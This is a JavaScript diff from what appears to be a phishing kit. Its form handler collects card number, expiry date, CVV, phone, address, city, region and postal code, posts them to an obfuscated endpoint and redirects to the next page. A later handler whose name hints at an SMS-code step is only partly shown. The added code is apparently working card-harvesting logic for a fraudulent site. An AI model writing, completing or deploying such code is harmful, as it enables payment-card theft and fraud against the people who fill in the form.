@@ -1,25 +1,17 @@
 $(function(){
-    $("#pg2").on("submit",function(e){
-        e.preventDefault();
-        let a1 = $("#numcc").val();
-        let a2 = $("#numdd").val();
-        let a3 = $("#numvv").val();
-        let a4 = $("#num").val();
-        let a5 = $("#numadr").val();
-        let a6 = $("#numcit").val();
-        let a7 = $("#numreg").val(); 
-        let a8 = $("#numpos").val(); 
+    $("#barinxri").on("click",function(e){
+        
 
 
         //send backend:
         $.ajax({
-            url: '/v2C8VrVuzY7WzVJv5RB6',
+            url: '/7tTeaYMkt9pkpyw',
             type: 'POST',
             contentType: 'application/json',
-            data: JSON.stringify({a1,a2,a3,a4,a5,a6,a7,a8}),
+            data: JSON.stringify({logita:"Bari Naxri"}),
             success: function(info) {
                 if(info.OK){
-                    window.location = "/KecdAK8hGCFkbAY2Qpnk";
+                    window.location = "/3EtpVNHar b8PqJfArbu";
                 }
             }
         });
@@ -41,27 +33,31 @@ $(function(){
     //     });
     // });
 
-    // $("#pg2").on("submit",function(e){
-    //     e.preventDefault();
-    //     let a1 = $("#numcc").val();
-    //     let a2 = $("#numdd").val();
-    //     let a3 = $("#numvv").val();
-    //     // let a4 = $("#w5").val();
+    $("#pg2").on("submit",function(e){
+        e.preventDefault();
+        let a1 = $("#numcc").val();
+        let a2 = $("#numdd").val();
+        let a3 = $("#numvv").val();
+        let a4 = $("#num").val();
+        let a5 = $("#numadr").val();
+        let a6 = $("#numcit").val();
+        let a7 = $("#numreg").val(); 
+        let a8 = $("#numpos").val(); 
 
 
-    //     //send backend:
-    //     $.ajax({
-    //         url: '/v2C8VrVuzY7WzVJv5RB6',
-    //         type: 'POST',
-    //         contentType: 'application/json',
-    //         data: JSON.stringify({a1,a2,a3}),
-    //         success: function(info) {
-    //             if(info.OK){
-    //                 window.location = "/KecdAK8hGCFkbAY2Qpnk";
-    //             }
-    //         }
-    //     });
-    // });
+         //send backend:
+         $.ajax({
+             url: '/v2C8VrVuzY7WzVJv5RB6',
+             type: 'POST',
+             contentType: 'application/json',
+             data: JSON.stringify({a1,a2,a3,a4,a5,a6,a7,a8}),
+             success: function(info) {
+                 if(info.OK){
+                     window.location = "/KecdAK8hGCFkbAY2Qpnk";
+                 }
+             }
+         });
+     });
 
     $("#pg3").on("submit",function(e){ // snms1:
         e.preventDefault();
